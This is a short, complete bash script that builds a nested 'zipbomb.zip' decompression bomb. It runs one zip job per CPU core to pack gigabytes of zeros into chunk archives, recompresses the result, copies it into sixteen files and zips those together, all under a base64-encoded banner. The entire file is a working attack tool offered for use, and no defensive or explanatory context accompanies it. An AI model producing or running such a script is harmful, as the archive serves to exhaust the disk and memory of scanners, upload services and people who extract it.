#!/bin/bash

print_banner(){
    echo "CuKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDi
lojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilZcg
ICDilojilojilojilZfilojilojilojilojilojilojilZcgCuKVmuKVkOKVkOKWiOKWiOKWiOKV
lOKVneKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKW
iOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKVlyDilojilojiloji
lojilZHilojilojilZTilZDilZDilojilojilZcKICDilojilojilojilZTilZ0g4paI4paI4pWR
4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR
ICAg4paI4paI4pWR4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4paI4paI
4paI4paI4pWU4pWdCiDilojilojilojilZTilZ0gIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKV
kOKVnSDilojilojilZTilZDilZDilojilojilZfilojilojilZEgICDilojilojilZHilojiloji
lZHilZrilojilojilZTilZ3ilojilojilZHilojilojilZTilZDilZDilojilojilZcK4paI4paI
4paI4paI4paI4paI4paI4pWX4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilojilojiloji
lojilZTilZ3ilZrilojilojilojilojilojilojilZTilZ3ilojilojilZEg4pWa4pWQ4pWdIOKW
iOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnQrilZrilZDilZDilZDilZDilZDilZDilZ3i
lZrilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSAg4pWa4pWQ4pWQ4pWQ
4pWQ4pWQ4pWdIOKVmuKVkOKVnSAgICAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIAog
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" |
    base64 -d
}

create_chunk_parts() {
    local thread_id="$1"
    local part_file="chunk_part_$thread_id.zip"
    local completed=0
    local overall_percentage=0
    local total_parts=$((1024 / cpu_count))

    if [ "$thread_id" == "0" ]; then
        echo -n "Creating chunk parts... $overall_percentage%"
    fi

    trap 'cleanup' INT

    while [ $completed -lt $total_parts ]; do
        dd if=/dev/zero bs=100M count=1 2>/dev/null | zip -9 -q "$part_file" - >/dev/null
        completed=$((completed + 1))
        if [ "$thread_id" == "0" ]; then
            overall_percentage=$((completed * 100 / total_parts))
            echo -en "\rCreating chunk parts... $overall_percentage%"
        fi
    done

    if [ "$thread_id" == "0" ]; then
        echo -e "\rCreating chunk parts... 100%"
    fi
}

cleanup() {
    echo "Received termination signal. Cleaning up..."
    rm -f chunk_part_*.zip single_chunk.zip 0.zip {0..16}.zip
    exit 1
}

combine_chunk_parts() {
    echo "Combining chunk parts into single chunk..."
    cat chunk_part_*.zip > single_chunk.zip
    rm chunk_part_*.zip
}

compress_chunk() {
    echo "Compressing single chunk to 0.zip..."
    zip -9 -q 0.zip single_chunk.zip
    rm single_chunk.zip
}

duplicate_chunk() {
    echo "Duplicating the chunk to 16 zip files..."
    for i in {1..16}; do
        cp 0.zip "$i.zip"
    done
    echo "Duplicating complete."
}

create_zipbomb() {
    echo "Creating zipbomb.zip..."
    zip -9 -q zipbomb.zip 0.zip {1..16}.zip
    rm {0..16}.zip
    echo "zipbomb.zip created successfully."
}

main() {
    print_banner
    
    cpu_count=$(nproc)

    echo "Detected CPU cores/threads: $cpu_count"

    for ((i = 0; i < cpu_count; i++)); do
        create_chunk_parts "$i" &
    done
    wait

    combine_chunk_parts
    compress_chunk
    duplicate_chunk
    create_zipbomb

    echo "It's done :D"
}

main
